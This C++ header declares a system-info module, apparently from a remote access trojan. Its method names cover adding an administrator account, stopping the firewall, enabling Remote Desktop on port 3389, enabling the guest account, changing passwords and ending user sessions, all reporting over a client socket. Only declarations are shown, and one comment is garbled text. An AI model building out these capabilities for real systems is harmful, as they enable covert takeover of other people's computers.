#pragma once

#include "../../PublicInclude/Manager.h"


class CSysInfo : public CManager  
{
public:
	void OnReceive(LPBYTE lpBuffer, UINT nSize);
	DWORD ChangePort(LPVOID lparam);
	BOOL StopFire();
	void AddAdminUser();
	void DeleteUser();
	BOOL OpenGuest();
	void ChangeUserPass();
	BOOL DelUserName(char *user);
	BOOL DelSidName(char *sid);
	void SendSysInfo();
	void WtsDisc(LPBYTE lpBuffer, UINT nSize);
	void WtsLoGoff(LPBYTE lpBuffer, UINT nSize);
	BOOL Open3389(BOOL falg);
	LPBYTE getWtsmList();
	LPBYTE getSList();
	void SendWtsmList();
	void SendSList();
	char* GetTSClientName(DWORD sessionID);
	char* GetTSClientProtocolType(DWORD sessionID);
	void  GetSystemInfo(MYSYSINFO* pSysInfo);
	void SendNetstart(LPBYTE lpBuffer, UINT nSize , UINT User_kt);  //’ ªß∆Ù”√ Õ£÷π
	CSysInfo(CClientSocket *pClient);
	virtual ~CSysInfo();
};

